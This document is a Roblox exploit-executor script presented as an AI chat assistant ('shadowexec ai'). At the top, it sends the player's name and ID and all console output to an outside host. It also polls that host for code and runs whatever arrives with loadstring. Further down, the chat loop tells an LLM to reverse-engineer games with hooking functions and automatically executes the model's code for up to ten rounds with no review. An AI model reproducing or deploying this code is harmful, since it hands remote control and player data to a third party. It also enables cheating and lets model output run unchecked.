local http = game:GetService("HttpService")
local uis = game:GetService("UserInputService")
local key = ""
local aikey = ""
local lp = game:GetService("Players").LocalPlayer

-- shadowexec connection
pcall(request, {
   Url = "https://shadowexec.vercel.app/api/log",
   Method = "POST",
   Headers = { ["Content-Type"] = "application/json" },
   Body = http:JSONEncode({ text = http:JSONEncode({ name = lp.Name, display = lp.DisplayName, id = lp.UserId }), type = "join", key = key })
})

task.spawn(function()
  game:GetService("LogService").MessageOut:Connect(function(msg, type)
    pcall(request, {
      Url = "https://shadowexec.vercel.app/api/log",
      Method = "POST",
      Headers = { ["Content-Type"] = "application/json" },
      Body = http:JSONEncode({ text = msg, type = type == Enum.MessageType.MessageOutput and "output" or type == Enum.MessageType.MessageWarning and "warning" or type == Enum.MessageType.MessageError and "error" or "info", key = key })
    })
  end)
end)

task.spawn(function()
  while true do
    pcall(function()
      local d = http:JSONDecode(request({ Url = "https://shadowexec.vercel.app/api/code?key=" .. key, Method = "GET" }).Body)
      if d and d.code then
        local ro, rv = pcall(loadstring(d.code))
        request({
          Url = "https://shadowexec.vercel.app/api/code",
          Method = "POST",
          Headers = { ["Content-Type"] = "application/json" },
          Body = http:JSONEncode({ id = d.id, key = key, output = ro and tostring(rv) or rv, success = ro })
        })
      end
    end)
    task.wait(0.2)
  end
end)

-- GUI
local aicontext = {}
local maxrounds = 10

local gui = Instance.new("ScreenGui")
gui.Name = "ShadowExecAI"
gui.ResetOnSpawn = false
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local main = Instance.new("Frame")
main.Size = UDim2.new(0, 360, 0, 440)
main.Position = UDim2.new(0.5, -180, 0.5, -220)
main.BackgroundColor3 = Color3.fromHex("1e1e1e")
main.BorderSizePixel = 0
main.ClipsDescendants = true
main.Parent = gui

Instance.new("UICorner", main).CornerRadius = UDim.new(0, 8)
Instance.new("UIStroke", main).Color = Color3.fromHex("3a3a3a")

-- drag
local dragging, dragStart, startPos
local topbar = Instance.new("Frame")
topbar.Size = UDim2.new(1, 0, 0, 30)
topbar.BackgroundColor3 = Color3.fromHex("171717")
topbar.BorderSizePixel = 0
topbar.Parent = main

Instance.new("UICorner", topbar).CornerRadius = UDim.new(0, 8)

local title = Instance.new("TextLabel")
title.Text = "  shadowexec ai"
title.Size = UDim2.new(1, -60, 1, 0)
title.BackgroundTransparency = 1
title.TextColor3 = Color3.fromHex("888888")
title.TextXAlignment = Enum.TextXAlignment.Left
title.Font = Enum.Font.GothamMedium
title.TextSize = 12
title.Parent = topbar

local closebtn = Instance.new("TextButton")
closebtn.Text = "×"
closebtn.Size = UDim2.new(0, 30, 0, 30)
closebtn.Position = UDim2.new(1, -30, 0, 0)
closebtn.BackgroundTransparency = 1
closebtn.TextColor3 = Color3.fromHex("888888")
closebtn.Font = Enum.Font.GothamBold
closebtn.TextSize = 18
closebtn.Parent = topbar

local minbtn = Instance.new("TextButton")
minbtn.Text = "—"
minbtn.Size = UDim2.new(0, 30, 0, 30)
minbtn.Position = UDim2.new(1, -60, 0, 0)
minbtn.BackgroundTransparency = 1
minbtn.TextColor3 = Color3.fromHex("888888")
minbtn.Font = Enum.Font.GothamBold
minbtn.TextSize = 12
minbtn.Parent = topbar

topbar.InputBegan:Connect(function(input)
  if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
    dragging = true
    dragStart = input.Position
    startPos = main.Position
    input.Changed:Connect(function()
      if input.UserInputState == Enum.UserInputState.End then dragging = false end
    end)
  end
end)

uis.InputChanged:Connect(function(input)
  if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
    local delta = input.Position - dragStart
    main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
  end
end)

-- model row
local modelrow = Instance.new("Frame")
modelrow.Size = UDim2.new(1, -12, 0, 26)
modelrow.Position = UDim2.new(0, 6, 0, 34)
modelrow.BackgroundTransparency = 1
modelrow.Parent = main

local modellbl = Instance.new("TextLabel")
modellbl.Text = "model"
modellbl.Size = UDim2.new(0, 40, 1, 0)
modellbl.BackgroundTransparency = 1
modellbl.TextColor3 = Color3.fromHex("666666")
modellbl.Font = Enum.Font.Gotham
modellbl.TextSize = 11
modellbl.TextXAlignment = Enum.TextXAlignment.Left
modellbl.Parent = modelrow

local modelbox = Instance.new("TextBox")
modelbox.Text = "anthropic/claude-sonnet-4"
modelbox.PlaceholderText = "model name"
modelbox.Size = UDim2.new(1, -44, 1, 0)
modelbox.Position = UDim2.new(0, 44, 0, 0)
modelbox.BackgroundColor3 = Color3.fromHex("2d2d2d")
modelbox.BorderSizePixel = 0
modelbox.TextColor3 = Color3.fromHex("d4d4d4")
modelbox.PlaceholderColor3 = Color3.fromHex("555555")
modelbox.Font = Enum.Font.Code
modelbox.TextSize = 11
modelbox.TextXAlignment = Enum.TextXAlignment.Left
modelbox.ClearTextOnFocus = false
modelbox.Parent = modelrow

Instance.new("UICorner", modelbox).CornerRadius = UDim.new(0, 4)
Instance.new("UIPadding", modelbox).PaddingLeft = UDim.new(0, 6)

-- chat area
local chatscroll = Instance.new("ScrollingFrame")
chatscroll.Size = UDim2.new(1, -12, 1, -102)
chatscroll.Position = UDim2.new(0, 6, 0, 64)
chatscroll.BackgroundColor3 = Color3.fromHex("171717")
chatscroll.BorderSizePixel = 0
chatscroll.ScrollBarThickness = 4
chatscroll.ScrollBarImageColor3 = Color3.fromHex("555555")
chatscroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
chatscroll.CanvasSize = UDim2.new(0, 0, 0, 0)
chatscroll.Parent = main

Instance.new("UICorner", chatscroll).CornerRadius = UDim.new(0, 4)

local chatlist = Instance.new("UIListLayout")
chatlist.SortOrder = Enum.SortOrder.LayoutOrder
chatlist.Padding = UDim.new(0, 4)
chatlist.Parent = chatscroll

Instance.new("UIPadding", chatscroll).PaddingTop = UDim.new(0, 4)

-- input row
local inputrow = Instance.new("Frame")
inputrow.Size = UDim2.new(1, -12, 0, 32)
inputrow.Position = UDim2.new(0, 6, 1, -38)
inputrow.BackgroundTransparency = 1
inputrow.Parent = main

local promptbox = Instance.new("TextBox")
promptbox.Text = ""
promptbox.PlaceholderText = "ask AI..."
promptbox.Size = UDim2.new(1, -56, 1, 0)
promptbox.BackgroundColor3 = Color3.fromHex("2d2d2d")
promptbox.BorderSizePixel = 0
promptbox.TextColor3 = Color3.fromHex("d4d4d4")
promptbox.PlaceholderColor3 = Color3.fromHex("555555")
promptbox.Font = Enum.Font.Gotham
promptbox.TextSize = 12
promptbox.TextXAlignment = Enum.TextXAlignment.Left
promptbox.ClearTextOnFocus = false
promptbox.Parent = inputrow

Instance.new("UICorner", promptbox).CornerRadius = UDim.new(0, 4)
Instance.new("UIPadding", promptbox).PaddingLeft = UDim.new(0, 8)

local sendbtn = Instance.new("TextButton")
sendbtn.Text = "Send"
sendbtn.Size = UDim2.new(0, 50, 1, 0)
sendbtn.Position = UDim2.new(1, -50, 0, 0)
sendbtn.BackgroundColor3 = Color3.fromHex("264f78")
sendbtn.BorderSizePixel = 0
sendbtn.TextColor3 = Color3.fromHex("d4d4d4")
sendbtn.Font = Enum.Font.GothamMedium
sendbtn.TextSize = 12
sendbtn.Parent = inputrow

Instance.new("UICorner", sendbtn).CornerRadius = UDim.new(0, 4)

-- chat functions
local msgorder = 0
local minimized = false

local function addchat(text, role)
  msgorder += 1
  local colors = {
    user = Color3.fromHex("264f78"),
    ai = Color3.fromHex("2d2d2d"),
    system = Color3.fromHex("1a2e1a"),
    err = Color3.fromHex("2a1a1a")
  }
  local textcolors = {
    user = Color3.fromHex("d4d4d4"),
    ai = Color3.fromHex("d4d4d4"),
    system = Color3.fromHex("7db07d"),
    err = Color3.fromHex("f44747")
  }

  local lbl = Instance.new("TextLabel")
  lbl.Size = UDim2.new(1, -8, 0, 0)
  lbl.AutomaticSize = Enum.AutomaticSize.Y
  lbl.BackgroundColor3 = colors[role] or colors.ai
  lbl.BorderSizePixel = 0
  lbl.TextColor3 = textcolors[role] or textcolors.ai
  lbl.Font = role == "system" and Enum.Font.Code or Enum.Font.Gotham
  lbl.TextSize = role == "system" and 10 or 12
  lbl.TextWrapped = true
  lbl.TextXAlignment = Enum.TextXAlignment.Left
  lbl.TextYAlignment = Enum.TextYAlignment.Top
  lbl.Text = text
  lbl.LayoutOrder = msgorder
  lbl.Parent = chatscroll

  Instance.new("UICorner", lbl).CornerRadius = UDim.new(0, 6)
  local pad = Instance.new("UIPadding", lbl)
  pad.PaddingTop = UDim.new(0, 6)
  pad.PaddingBottom = UDim.new(0, 6)
  pad.PaddingLeft = UDim.new(0, 8)
  pad.PaddingRight = UDim.new(0, 8)

  task.defer(function()
    chatscroll.CanvasPosition = Vector2.new(0, chatscroll.AbsoluteCanvasSize.Y)
  end)

  return lbl
end

local function aiask(prompt)
  if prompt == "" or aikey == "" then return end

  addchat(prompt, "user")
  table.insert(aicontext, { role = "user", content = prompt })

  for round = 1, maxrounds do
    local thinking = addchat("thinking" .. (round > 1 and " (round " .. round .. ")" or "") .. "...", "system")

    local ok, result = pcall(function()
      local r = request({
        Url = "https://openrouter.ai/api/v1/chat/completions",
        Method = "POST",
        Headers = {
          ["Content-Type"] = "application/json",
          ["Authorization"] = "Bearer " .. aikey
        },
        Body = http:JSONEncode({
          model = modelbox.Text,
          messages = {
            { role = "system", content = "You are a Luau scripting assistant for Roblox executors. Generate executable Luau code in ```lua blocks. Be concise. Available globals: request, loadstring, getgenv, hookfunction, hookmetamethod, getrawmetatable, setreadonly, fireclickdetector, firesignal, getconnections, getsenv, getupvalues, decompile, getscriptbytecode, etc. When exploring or reversing a game, keep going until you have a complete picture — don't stop after one step. If you need more info, write code to get it. When you're fully done, say DONE on its own line." },
            unpack(aicontext)
          }
        })
      })
      return http:JSONDecode(r.Body)
    end)

    thinking:Destroy()

    if not ok or not result or not result.choices then
      addchat("request failed", "err")
      break
    end

    local msg = result.choices[1].message.content
    table.insert(aicontext, { role = "assistant", content = msg })
    addchat(msg, "ai")

    local code = msg:match("```lua%s*(.-)```") or msg:match("```luau%s*(.-)```") or msg:match("```%s*(.-)```")

    if not code then
      break
    end

    addchat("executing...", "system")
    local success, err = pcall(loadstring(code))
    if success then
      local fb = "ok: " .. tostring(err)
      addchat(fb, "system")
      table.insert(aicontext, { role = "user", content = "Execution succeeded. Return: " .. tostring(err) })
    else
      local fb = "error: " .. tostring(err)
      addchat(fb, "err")
      table.insert(aicontext, { role = "user", content = "Execution failed: " .. tostring(err) })
    end

    if success and (msg:match("\nDONE%s*$") or msg:match("^DONE%s*$")) then
      addchat("task complete", "system")
      break
    end

    task.wait(0.5)
  end
end

-- button handlers
sendbtn.MouseButton1Click:Connect(function()
  local text = promptbox.Text
  promptbox.Text = ""
  task.spawn(aiask, text)
end)

promptbox.FocusLost:Connect(function(enter)
  if enter then
    local text = promptbox.Text
    promptbox.Text = ""
    task.spawn(aiask, text)
  end
end)

closebtn.MouseButton1Click:Connect(function()
  gui:Destroy()
end)

minbtn.MouseButton1Click:Connect(function()
  minimized = not minimized
  if minimized then
    main.Size = UDim2.new(0, 360, 0, 30)
    chatscroll.Visible = false
    inputrow.Visible = false
    modelrow.Visible = false
  else
    main.Size = UDim2.new(0, 360, 0, 440)
    chatscroll.Visible = true
    inputrow.Visible = true
    modelrow.Visible = true
  end
end)

-- mount
local function mountgui()
  if syn and syn.protect_gui then
    syn.protect_gui(gui)
  end

  local targets = {
    gethui and gethui(),
    cloneref and cloneref(game:GetService("CoreGui")),
    game:GetService("CoreGui"),
    lp:FindFirstChildOfClass("PlayerGui")
  }

  for _, target in ipairs(targets) do
    local ok, err = pcall(function()
      gui.Parent = target
    end)
    if ok and gui.Parent then
      print("[shadowexec] gui mounted to: " .. tostring(target))
      return true
    end
  end

  warn("[shadowexec] all mount targets failed")
  return false
end

if mountgui() then
  addchat("shadowexec ai ready", "system")
  addchat("model: " .. modelbox.Text, "system")
else
  warn("[shadowexec] gui could not mount — check executor permissions")
end
print("[shadowexec] script loaded")
